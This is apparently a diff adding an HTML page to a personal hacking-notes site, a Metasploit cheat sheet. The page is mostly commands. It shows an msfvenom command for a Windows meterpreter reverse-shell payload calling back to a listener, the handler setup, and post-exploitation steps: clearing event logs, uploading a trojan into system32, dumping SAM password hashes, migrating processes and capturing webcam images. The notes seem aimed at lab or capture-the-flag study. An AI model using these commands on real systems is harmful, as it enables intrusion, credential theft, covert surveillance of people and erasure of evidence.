@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Metasploit</h1>
+            <p>Metasploit is an open-source penetration testing framework used to identify, exploit, and validate security vulnerabilities on computer systems and networks</p>
+        </div>
+        <div class="notion-body">
+            <h2>Capturing reverse shell</h2>
+            <ul>    
+                    <p>Using msfvenom create payload in base64. Adjust payload to SO and version. In this case we are using meterpreter</p>
+                    <p>This will output a base64 which can be pasted in order to execute commands</p>
+                    <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=443 -f psh-cmd</code></pre>
+                    <p>Use the following plugin</p>
+                    <pre><code class="language-bash">exploit/multi/handler</code></pre>
+                    <p>Configure it using the same payload that you used to created in msfvenom</p>
+            </ul>
+
+            <h2>Post exploitation</h2>
+            <ul>    
+                <p>Once you have a established reverse shell using meterpreter you can perform some post exploitation basics</p>
+                
+                <pre><code class="language-bash">shell</code></pre>
+                <pre><code class="language-bash">background</code></pre>
+                
+                <h2>Exploit suggester </h2>
+                <p>Use the following plugin to detect exploits on the victim machine</p>
+                <pre><code class="language-bash">meterpreter > run post/multi/recon/local_exploit_suggester</code></pre>
+
+                <h2>Clear logs</h2>
+                <p>From meterpreter type the following command to clear logs</p>
+                <pre><code class="language-bash">meterpreter > clearev</code></pre>
+                
+                <h2>Dowload & upload</h2>
+                <pre><code class="language-bash">meterpreter > download c:\\boot.ini</code></pre>
+                <pre><code class="language-bash">meterpreter > upload evil_trojan.exe c:\\windows\\system32</code></pre>
+
+                <h2>Dump hashes</h2>
+                <p>The hashdump post module will dump the contents of the SAM database.</p>
+                <pre><code class="language-bash">meterpreter > run post/windows/gather/hashdump</code></pre>
+
+                <h2>Migrate shell</h2>
+                <p>Using the migrate post module, you can migrate to another process on the victim.</p>
+                <pre><code class="language-bash">meterpreter > run post/windows/manage/migrate</code></pre>
+
+                <h2>Webcam list</h2>
+                <p>The webcam_list command when run from the Meterpreter shell, will display currently available web cams on the target host.</p>
+                <pre><code class="language-bash">meterpreter > webcam_list</code></pre>
+
+                <h2>Webcam Snap</h2>
+                <p>The webcam_list command when run from the Meterpreter shell, will display currently available web cams on the target host.</p>
+                <pre><code class="language-bash">meterpreter > webcam_snap -h</code></pre>
+                
+                <p></p>
+            </ul>
+  
+        </div>
+    </div>
+</body>
+</html>
